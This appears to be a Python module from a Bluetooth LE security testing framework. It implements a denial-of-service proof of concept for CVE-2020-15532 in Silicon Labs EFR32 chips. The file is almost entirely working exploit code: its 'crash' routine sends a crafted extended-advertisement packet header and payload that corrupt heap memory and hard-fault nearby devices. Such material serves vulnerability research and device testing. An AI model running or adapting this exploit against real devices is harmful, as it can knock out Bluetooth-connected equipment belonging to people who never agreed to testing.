import time
import struct

class TestSet():

    def __init__(self, subparsers):
        self.cmd = 'silabs_extadv_dos'

        self.parser = subparsers.add_parser(self.cmd,
                          help='[CVE-2020-15532] Silicon Labs EFR32 Extended Advertisement Heap Memory Corruption DoS PoC')
        self.parser.add_argument('action', choices=['crash'], help='Choose an action')
        self.funcs = {'crash':self.crash}

    def getCmd(self):
        return self.cmd

    def run(self, hci_manager, action):
        self.hm = hci_manager
        self.funcs[action]()

    # generate packets to cause a hardfault due to a memory access violation
    def crash(self):
        self.hm.set_filter()
        time.sleep(1)

        self.hm.set_ext_adv_params()
        self.hm.enable_custom_ac_pdu(True)
        self.hm.send_ac_pdu_header(0x07)
        self.hm.send_ac_pdu_payload(b"\x03\x00\x00", False)
        self.hm.enable_ext_adv(True)

        time.sleep(5)

        self.hm.stop(None, None)
